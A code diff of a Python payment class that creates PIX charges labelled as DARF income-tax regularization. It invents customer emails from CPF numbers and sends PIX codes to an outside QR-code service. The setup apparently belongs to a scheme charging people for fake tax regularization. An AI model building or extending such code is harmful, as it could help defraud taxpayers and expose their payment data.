@@ -37,25 +37,25 @@ class FuriaPayService:
             payload = {
                 "amount": valor_centavos,
                 "paymentMethod": "pix",
-                "pix": {
-                    "expiresInMinutes": 1440  # 24 horas
-                },
                 "items": [
                     {
                         "title": "Regularização DARF - Imposto de Renda",
                         "unitPrice": valor_centavos,
                         "quantity": 1,
-                        "tangible": False
+                        "tangible": False,
+                        "externalRef": ""
                     }
                 ],
                 "customer": {
                     "name": nome,
-                    "documentNumber": cpf.replace('.', '').replace('-', ''),
-                    "email": f"{cpf.replace('.', '').replace('-', '')}@regularizacao.temp",  # Email temporário
-                    "phoneNumber": "11999999999"
+                    "email": f"{cpf.replace('.', '').replace('-', '')}@regularizacao.temp",
+                    "phone": None,
+                    "document": {
+                        "type": "cpf",
+                        "number": cpf.replace('.', '').replace('-', '')
+                    }
                 },
-                "externalRef": protocol,
-                "metadata": f"Regularização CPF {cpf} - Protocolo {protocol}"
+                "externalRef": protocol
             }
             
             # Faz requisição para API
@@ -85,10 +85,9 @@ class FuriaPayService:
                     'success': True,
                     'transaction_id': data.get('id'),
                     'status': data.get('status'),
-                    'pix_code': pix_data.get('qrCode', ''),  # Código PIX copia e cola
-                    'qr_code_url': pix_data.get('qrCodeUrl', ''),  # URL do QR Code
-                    'qr_code_base64': pix_data.get('qrCodeBase64', ''),  # QR Code em base64
-                    'expires_at': pix_data.get('expiresAt'),
+                    'pix_code': pix_data.get('qrcode', ''),  # Código PIX copia e cola
+                    'qr_code_url': f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={pix_data.get('qrcode', '')}",  # Gera QR Code
+                    'expires_at': pix_data.get('expirationDate'),
                     'amount': valor
                 }
             else:
